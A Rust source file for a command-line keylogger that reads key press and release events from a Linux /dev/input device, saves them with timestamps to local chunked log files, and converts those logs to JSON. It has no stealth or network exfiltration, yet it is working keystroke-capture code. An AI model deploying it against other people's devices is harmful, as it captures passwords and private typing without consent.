use chrono::{DateTime, Utc};
use clap::Parser;
use evdev_rs::enums::{EventCode, EventType, EV_KEY};
use evdev_rs::{Device, DeviceWrapper, ReadFlag, TimeVal};
use serde::{Deserialize, Serialize};
use std::fs::{self, read_dir, File};
use std::io::{self, BufWriter, Read, Write};
use std::os::unix::fs::FileTypeExt;
use std::path::{Path, PathBuf};
use std::process;
use std::sync::{Arc, Mutex};
use std::time::SystemTime;

const MAX_CHUNK_SIZE: usize = 1024 * 10;

#[derive(Parser, Debug)]
pub struct KeyLoggerArguments {
    #[clap(subcommand)]
    subcommand: KeyLoggerSubCommand,
}

#[derive(Parser, Debug)]
enum KeyLoggerSubCommand {
    Start(StartKeyLoggerArguments),
    ParseLog(ParseKeyLogFileArguments),
}

#[derive(Parser, Debug)]
pub struct StartKeyLoggerArguments {
    #[arg(long = "device", short = 'd')]
    device: String,

    #[arg(long = "output-directory", short = 'o', default_value = "./output")]
    output_directory: String,
}

#[derive(Parser, Debug)]
pub struct ParseKeyLogFileArguments {
    #[arg()]
    input_path: String,
}

#[allow(non_camel_case_types)]
#[derive(Copy, Clone, Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
enum KeyEventAction {
    KEY_RELEASE = 0,
    KEY_PRESS = 1,
    KEY_REPEAT = 2,
}

impl KeyEventAction {
    pub const fn from_int(code: i32) -> Option<KeyEventAction> {
        match code {
            0 => Some(KeyEventAction::KEY_RELEASE),
            1 => Some(KeyEventAction::KEY_PRESS),
            2 => Some(KeyEventAction::KEY_REPEAT),
            _ => None,
        }
    }
}

#[derive(Copy, Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
struct KeyLogEvent {
    time: TimeVal,
    action: KeyEventAction,
    code: EV_KEY,
}

#[derive(Debug)]
struct EventChunkWriter {
    buffer: Vec<KeyLogEvent>,
    output_directory: PathBuf,
    max_chunk_size: usize,
}

impl EventChunkWriter {
    fn new(output_directory: &Path, max_chunk_size: usize) -> EventChunkWriter {
        assert!(output_directory.is_dir());
        EventChunkWriter {
            buffer: vec![],
            output_directory: output_directory.to_owned(),
            max_chunk_size,
        }
    }

    fn add(&mut self, event: KeyLogEvent) -> Result<(), Box<dyn std::error::Error>> {
        self.buffer.push(event);

        if self.buffer.len() >= self.max_chunk_size {
            return self.flush();
        }

        Ok(())
    }

    fn flush(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if !self.buffer.is_empty() {

            let serialized_buffer = bincode::serialize(&self.buffer)?;

            let now = SystemTime::now();
            let now: DateTime<Utc> = now.into();
            let now = now.format("%Y-%m-%dT%H:%M:%S");

            let filename = now.to_string() + ".log";
            let output_path = self.output_directory.join(filename);
            println!("flush to {}", output_path.to_str().unwrap());

            let output_file = File::options()
                .write(true)
                .create_new(true)
                .open(output_path)?;

            let mut output_writer = BufWriter::new(output_file);
            output_writer.write_all(&serialized_buffer)?;
            self.buffer.clear();
        }

        Ok(())
    }
}

pub fn keylogger(args: KeyLoggerArguments) -> Result<(), Box<dyn std::error::Error>> {
    match args.subcommand {
        KeyLoggerSubCommand::Start(subcommand_args) => run_keylogger(subcommand_args)?,
        KeyLoggerSubCommand::ParseLog(subcommand_args) => parse_log_file(subcommand_args)?,
    };

    Ok(())
}

pub fn run_keylogger(args: StartKeyLoggerArguments) -> Result<(), Box<dyn std::error::Error>> {
    let device = get_device(&args.device)?;

    let output_directory = Path::new(&args.output_directory);
    fs::create_dir_all(output_directory)?;
    let event_writer = Arc::new(Mutex::new(EventChunkWriter::new(
        output_directory,
        MAX_CHUNK_SIZE,
    )));

    let auto_flush_writer = Arc::clone(&event_writer);
    ctrlc::set_handler(move || {
        let mut out_writer = auto_flush_writer.lock().unwrap();
        out_writer.flush().expect("Fail to flush log file");
        process::exit(0);
    })?;

    loop {
        if let Ok(ev) = device.next_event(ReadFlag::NORMAL).map(|val| val.1) {
            if ev.event_type() != Some(EventType::EV_KEY) {
                continue;
            }

            let action = KeyEventAction::from_int(ev.value);
            if action != Some(KeyEventAction::KEY_PRESS)
                && action != Some(KeyEventAction::KEY_RELEASE)
            {
                continue;
            }

            if let EventCode::EV_KEY(event_code) = ev.event_code {
                let key_log_event = KeyLogEvent {
                    time: ev.time,
                    action: action.unwrap(),
                    code: event_code,
                };

                let mut event_writer = event_writer.lock().unwrap();
                event_writer.add(key_log_event)?;
            }
        }
    }
}

fn get_device(device_path_or_name: &str) -> Result<Device, std::io::Error> {
    if let Ok(device) = Device::new_from_path(device_path_or_name) {
        return Ok(device);
    }

    let paths = read_dir("/dev/input")?;
    for entry in paths.flatten() {
        let file_type = entry.file_type();

        if file_type.is_ok_and(|t| t.is_char_device()) {
            if let Ok(device) = Device::new_from_path(entry.path()) {
                if device.name().is_some_and(|n| n == device_path_or_name) {
                    return Ok(device);
                }
            }
        }
    }

    Err(io::Error::new(
        io::ErrorKind::NotFound,
        "Fail to find device by name",
    ))
}

pub fn parse_log_file(args: ParseKeyLogFileArguments) -> Result<(), Box<dyn std::error::Error>> {
    let input_file = Path::new(&args.input_path);
    let mut input_file = File::options()
        .read(true)
        .open(input_file)?;
    let mut input_buf: Vec<u8> = vec![];
    input_file.read_to_end(&mut input_buf)?;
    let input_events: Vec<KeyLogEvent> = bincode::deserialize(&input_buf)?;
    let json_events = serde_json::to_string_pretty(&input_events)?;
    println!("{}", json_events);

    Ok(())
}
